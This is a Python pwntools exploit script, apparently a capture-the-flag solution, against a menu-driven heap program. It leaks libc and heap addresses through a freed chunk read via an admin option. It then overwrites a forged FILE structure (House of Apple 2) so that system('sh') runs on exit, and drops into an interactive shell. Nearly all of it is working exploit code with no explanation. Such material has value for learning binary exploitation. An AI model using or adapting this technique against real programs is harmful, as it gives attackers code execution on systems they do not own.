from pwn import *
from pwncli import IO_FILE_plus_struct
exe = context.binary = ELF('./program_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
HOST = 'localhost'
PORT = 3000

def get_proc():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        p = process()
        if args.GDB:
            gdb.attach(p)
        return p 

p = get_proc()

def alloc(size, message):
    p.sendlineafter(b'-> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', message)

def delete():
    p.sendlineafter(b'-> ', b'2')

def edit(message):
    p.sendlineafter(b'-> ', b'3')
    p.sendlineafter(b': ', message)

def show():
    p.sendlineafter(b'-> ', b'4')

def exit():
    p.sendlineafter(b'-> ', b'5')

def admin():
    p.sendlineafter(b'-> ', b'9')

alloc(0x1d0, b'abcd')
delete()
admin()
show()
p.recvuntil(b'message: ')
leak_dump = p.recv(0x1d0)
libc.address = u64(leak_dump[0x68:0x70]) - libc.sym['_IO_2_1_stderr_']
chunk_addr = u64(leak_dump[0xa0:0xa8]) - 0xf0
log.info(f"Libc base: 0x{libc.address:x}")
log.info(f"Chunk addr: 0x{chunk_addr:x}")

file = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(
    chunk_addr, 
    libc.sym._IO_wfile_jumps, 
    libc.sym.system, "sh"
)

edit(file)
exit()
p.interactive()
